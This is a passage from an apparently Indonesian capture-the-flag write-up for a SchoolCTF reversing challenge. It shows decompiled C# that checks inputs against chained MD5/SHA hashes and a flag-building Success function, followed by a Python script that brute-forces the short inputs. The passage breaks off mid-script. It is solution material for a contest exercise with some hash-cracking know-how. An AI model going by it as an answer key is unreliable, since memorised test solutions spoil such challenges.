                    &lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetNotepadWindow&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;0nly&quot;&lt;/span&gt;);
                    &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt; null&lt;/span&gt;)
                    {
                        &lt;span style=&quot;color:#dad085;&quot;&gt;string&lt;/span&gt; &lt;span style=&quot;color:#3e87e3;&quot;&gt;text3&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetText&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt;);
                        &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetMd5Hash&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Ooooh so&quot;&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#3e87e3;&quot;&gt; text3&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;salty&quot;&lt;/span&gt;) &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;d0061dcf056a06713d5a757e0288d1b3&quot;&lt;/span&gt;)
                        {
                            SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
                        }
                        &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
                        {
                            &lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetNotepadWindow&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Ca11&quot;&lt;/span&gt;);
                            &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt; null&lt;/span&gt;)
                            {
                                &lt;span style=&quot;color:#dad085;&quot;&gt;string&lt;/span&gt; &lt;span style=&quot;color:#3e87e3;&quot;&gt;text4&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetText&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt;);
                                &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetMd5Hash&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Stop trying to crack me god damnit!!!&quot;&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetSha384Hash&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;text4&lt;/span&gt;)) &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;5056e21f6af2a289c9c3116c16bba55f&quot;&lt;/span&gt;) 
                                {
                                    SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
                                }
                                &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
                                {
                                    &lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetNotepadWindow&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;M3&quot;&lt;/span&gt;);
                                    &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt; null&lt;/span&gt;)
                                    {
                                        &lt;span style=&quot;color:#dad085;&quot;&gt;string&lt;/span&gt; &lt;span style=&quot;color:#3e87e3;&quot;&gt;text5&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetText&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt;);
                                        &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetSha256Hash&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;text5&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;91&quot;&lt;/span&gt;) &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;8e9b669109df89620b94f2387dc53206a82ddc71d658f8f7a2b3a9b417370d3e&quot;&lt;/span&gt;)
                                        {
                                            SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
                                        }
                                        &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
                                        {
                                            &lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetNotepadWindow&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Wh3n&quot;&lt;/span&gt;);
                                            &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt; null&lt;/span&gt;)
                                            {
                                                &lt;span style=&quot;color:#dad085;&quot;&gt;string&lt;/span&gt; &lt;span style=&quot;color:#3e87e3;&quot;&gt;text6&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetText&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt;);
                                                &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetSha512Hash&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;text6&lt;/span&gt;) &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;566b014c957c19cb81aab7776eaf614701dadc084aa73fd002301bc7277091c4269ce1223d16746df4e803b85171733b89fa34bb1c61830799dee3611c38e006&quot;&lt;/span&gt;) 
                                                {
                                                    SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
                                                }
                                                &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
                                                {
                                                    &lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetNotepadWindow&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;You'r&quot;&lt;/span&gt;);
                                                    &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt; null&lt;/span&gt;)
                                                    {
                                                        &lt;span style=&quot;color:#dad085;&quot;&gt;string&lt;/span&gt; &lt;span style=&quot;color:#3e87e3;&quot;&gt;text7&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetText&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt;);
                                                        &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetMd5Hash&lt;/span&gt;&lt;/span&gt;(SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetSha384Hash&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Oh, i see you reading my source code! &amp;gt;:)&quot;&lt;/span&gt;) &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#3e87e3;&quot;&gt; text7&lt;/span&gt;) &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;c866a4f386df3da51a54c1f8434603eb&quot;&lt;/span&gt;)
                                                        {
                                                            SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
                                                        }
                                                        &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
                                                        {
                                                            &lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetNotepadWindow&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;H1gh&quot;&lt;/span&gt;);
                                                            &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt; null&lt;/span&gt;)
                                                            {
                                                                &lt;span style=&quot;color:#dad085;&quot;&gt;string&lt;/span&gt; &lt;span style=&quot;color:#3e87e3;&quot;&gt;text8&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetText&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt;);
                                                                &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetSha256Hash&lt;/span&gt;&lt;/span&gt;(SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetSha384Hash&lt;/span&gt;&lt;/span&gt;(SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetSha512Hash&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;FILL THE POWER OF SHA&quot;&lt;/span&gt;)) &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#3e87e3;&quot;&gt; text8&lt;/span&gt;) &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;7f6e2c5beefd0fd0000c3a72db28b54d0819a93f5cc87a48507f79cdac37cfe0&quot;&lt;/span&gt;)
                                                                {
                                                                    SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
                                                                }
                                                                &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
                                                                {
                                                                    SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Success&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;text&lt;/span&gt;,&lt;span style=&quot;color:#3e87e3;&quot;&gt; text2&lt;/span&gt;,&lt;span style=&quot;color:#3e87e3;&quot;&gt; text3&lt;/span&gt;,&lt;span style=&quot;color:#3e87e3;&quot;&gt; text4&lt;/span&gt;,&lt;span style=&quot;color:#3e87e3;&quot;&gt; text5&lt;/span&gt;,&lt;span style=&quot;color:#3e87e3;&quot;&gt; text6&lt;/span&gt;,&lt;span style=&quot;color:#3e87e3;&quot;&gt; text7&lt;/span&gt;,&lt;span style=&quot;color:#3e87e3;&quot;&gt; text8&lt;/span&gt;);
                                                                }
                                                            }
                                                            &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
                                                            {
                                                                SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
                                                            }
                                                        }
                                                    }
                                                    &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
                                                    {
                                                        SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
                                                    }
                                                }
                                            }
                                            &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
                                            {
                                                SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
                                            }
                                        }
                                    }
                                    &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
                                    {
                                        SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
                                    }
                                }
                            }
                            &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
                            {
                                SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
                            }
                        }
                    }
                    &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
                    {
                        SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
                    }
                }
            }
            &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
            {
                SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
            }
        }
    }
    &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
    {
        SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
    }
}

&lt;/pre&gt;
&lt;p&gt;Fungsi success&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;&lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;// MD5Sample.SchoolCTF&lt;/span&gt;
public &lt;span style=&quot;color:#99cf50;&quot;&gt;static&lt;/span&gt; &lt;span style=&quot;color:#99cf50;&quot;&gt;void&lt;/span&gt; &lt;span style=&quot;color:#89bdff;&quot;&gt;Success&lt;/span&gt;(string p1, string p2, string p3, string p4, string p5, string p6, string p7, string p8)
{
    StringBuilder stringBuilder = new StringBuilder(&quot;Please stop it, noooooo&quot;);
    stringBuilder[0] = p8[1];
    stringBuilder[1] = p8[0];
    stringBuilder[2] = p6[1];
    stringBuilder[3] = p6[0];
    stringBuilder[4] = p2[3];
    stringBuilder[5] = p7[1];
    stringBuilder[6] = p1[1];
    stringBuilder[7] = p1[0];
    stringBuilder[8] = p7[0];
    stringBuilder[9] = p2[1];
    stringBuilder[10] = p1[2];
    stringBuilder[11] = p6[2];
    stringBuilder[12] = p2[2];
    stringBuilder[13] = p3[0];
    stringBuilder[14] = 'y';
    stringBuilder[15] = p2[0];
    stringBuilder[16] = p3[1];
    stringBuilder[17] = p3[2];
    stringBuilder[18] = 'r';
    stringBuilder[19] = p4[0];
    stringBuilder[20] = p5[0];
    stringBuilder[21] = 'n';
    stringBuilder[22] = p5[1];
    MessageBox.&lt;span style=&quot;color:#dad085;&quot;&gt;Show&lt;/span&gt;(&quot;SchoolCTF{&quot; + stringBuilder.&lt;span style=&quot;color:#dad085;&quot;&gt;ToString&lt;/span&gt;() + &quot;}&quot;);
    Console.&lt;span style=&quot;color:#dad085;&quot;&gt;WriteLine&lt;/span&gt;(&quot;{0}&quot;, stringBuilder);
    Process process = Process.&lt;span style=&quot;color:#dad085;&quot;&gt;Start&lt;/span&gt;(new ProcessStartInfo(&quot;notepad&lt;span style=&quot;color:#3e87e3;&quot;&gt;.exe&lt;/span&gt;&quot;)
    {
        WindowStyle = ProcessWindowStyle&lt;span style=&quot;color:#3e87e3;&quot;&gt;.Maximized&lt;/span&gt;
    });
    process.&lt;span style=&quot;color:#dad085;&quot;&gt;WaitForInputIdle&lt;/span&gt;();
    SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;SendText&lt;/span&gt;(process, SchoolCTF&lt;span style=&quot;color:#3e87e3;&quot;&gt;.succeeded&lt;/span&gt;);
}

&lt;/pre&gt;
&lt;p&gt;Tujuan nya adalah untuk memasukan nilai yang benar sehingga semua kondisi pada fungsi Main bernilai True dan akan memanggil fungsi Success.&lt;/p&gt;

&lt;p&gt;Berikut script yang digunakan untuk mendapatkan inputan yang benar dan fungsi success di reimplemented lagi agar bisa langsung mengeluarkan Flag.&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;import&lt;/span&gt; itertools
&lt;span style=&quot;color:#e28964;&quot;&gt;import&lt;/span&gt; string
&lt;span style=&quot;color:#e28964;&quot;&gt;import&lt;/span&gt; hashlib

leters &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; string.ascii_letters &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; string.punctuation &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; string.digits

&lt;span style=&quot;color:#99cf50;&quot;&gt;def&lt;/span&gt; &lt;span style=&quot;color:#89bdff;&quot;&gt;generator&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;n&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt;1&lt;/span&gt;):
    a &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; itertools.product(leters,&lt;span style=&quot;color:#3e87e3;&quot;&gt;repeat&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;n)
    &lt;span style=&quot;color:#e28964;&quot;&gt;return&lt;/span&gt; a

&lt;span style=&quot;color:#99cf50;&quot;&gt;def&lt;/span&gt; &lt;span style=&quot;color:#89bdff;&quot;&gt;text3&lt;/span&gt;():
    &lt;span style=&quot;color:#e28964;&quot;&gt;for&lt;/span&gt; char &lt;span style=&quot;color:#e28964;&quot;&gt;in&lt;/span&gt; generator(&lt;span style=&quot;color:#3387cc;&quot;&gt;3&lt;/span&gt;):
        char &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&quot;&lt;/span&gt;.join(char)
        possible &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Ooooh so{}salty&quot;&lt;/span&gt;.format(char)
        hashMD5 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; hashlib.md5(possible).hexdigest()
        &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; hashMD5 &lt;span style=&quot;color:#e28964;&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;d0061dcf056a06713d5a757e0288d1b3&quot;&lt;/span&gt;:
            &lt;span style=&quot;color:#e28964;&quot;&gt;print&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Found Text3 {}&quot;&lt;/span&gt;.format(char)
            &lt;span style=&quot;color:#e28964;&quot;&gt;return&lt;/span&gt; char
        &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;:
            &lt;span style=&quot;color:#e28964;&quot;&gt;continue&lt;/span&gt;

&lt;span style=&quot;color:#99cf50;&quot;&gt;def&lt;/span&gt; &lt;span style=&quot;color:#89bdff;&quot;&gt;text4&lt;/span&gt;():
    &lt;span style=&quot;color:#e28964;&quot;&gt;for&lt;/span&gt; char &lt;span style=&quot;color:#e28964;&quot;&gt;in&lt;/span&gt; generator(&lt;span style=&quot;color:#3387cc;&quot;&gt;1&lt;/span&gt;):
        char &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&quot;&lt;/span&gt;.join(char)
        hash384 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; hashlib.sha384(char).hexdigest()
        possible &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Stop trying to crack me god damnit!!!{}&quot;&lt;/span&gt;.format(hash384)
        hashMD5 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; hashlib.md5(possible).hexdigest()
        &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; hashMD5 &lt;span style=&quot;color:#e28964;&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;5056e21f6af2a289c9c3116c16bba55f&quot;&lt;/span&gt;:
            &lt;span style=&quot;color:#e28964;&quot;&gt;print&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Found Text4 {}&quot;&lt;/span&gt;.format(char)
            &lt;span style=&quot;color:#e28964;&quot;&gt;return&lt;/span&gt; char
        &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;:
            &lt;span style=&quot;color:#e28964;&quot;&gt;continue&lt;/span&gt;
&lt;span style=&quot;color:#99cf50;&quot;&gt;def&lt;/span&gt; &lt;span style=&quot;color:#89bdff;&quot;&gt;text7&lt;/span&gt;():
    hash384 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; hashlib.sha384(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Oh, i see you reading my source code! &amp;gt;:)&quot;&lt;/span&gt;).hexdigest()
    &lt;span style=&quot;color:#e28964;&quot;&gt;for&lt;/span&gt; char &lt;span style=&quot;color:#e28964;&quot;&gt;in&lt;/span&gt; generator(&lt;span style=&quot;color:#3387cc;&quot;&gt;2&lt;/span&gt;):
        char &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&quot;&lt;/span&gt;.join(char)
        possible &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;{0}{1}&quot;&lt;/span&gt;.format(hash384,char)
        hashMD5 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; hashlib.md5(possible).hexdigest()
        &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; hashMD5 &lt;span style=&quot;color:#e28964;&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;c866a4f386df3da51a54c1f8434603eb&quot;&lt;/span&gt;:
            &lt;span style=&quot;color:#e28964;&quot;&gt;print&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Found Text7 {}&quot;&lt;/span&gt;.format(char)
            &lt;span style=&quot;color:#e28964;&quot;&gt;return&lt;/span&gt; char
        &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;:
            &lt;span style=&quot;color:#e28964;&quot;&gt;continue&lt;/span&gt;    
&lt;span style=&quot;color:#99cf50;&quot;&gt;def&lt;/span&gt; &lt;span style=&quot;color:#89bdff;&quot;&gt;text8&lt;/span&gt;():
    hash384 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; hashlib.sha384(hashlib.sha512(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;FILL THE POWER OF SHA&quot;&lt;/span&gt;).hexdigest()).hexdigest()
    &lt;span style=&quot;color:#e28964;&quot;&gt;for&lt;/span&gt; char &lt;span style=&quot;color:#e28964;&quot;&gt;in&lt;/span&gt; generator(&lt;span style=&quot;color:#3387cc;&quot;&gt;2&lt;/span&gt;):
        char &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&quot;&lt;/span&gt;.join(char)
        possible &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;{0}{1}&quot;&lt;/span&gt;.format(hash384,char)
        hashMD5 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; hashlib.sha256(possible).hexdigest()
        &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; hashMD5 &lt;span style=&quot;color:#e28964;&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;7f6e2c5beefd0fd0000c3a72db28b54d0819a93f5cc87a48507f79cdac37cfe0&quot;&lt;/span&gt;:
            &lt;span style=&quot;color:#e28964;&quot;&gt;print&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Found Text8 {}&quot;&lt;/span&gt;.format(char)
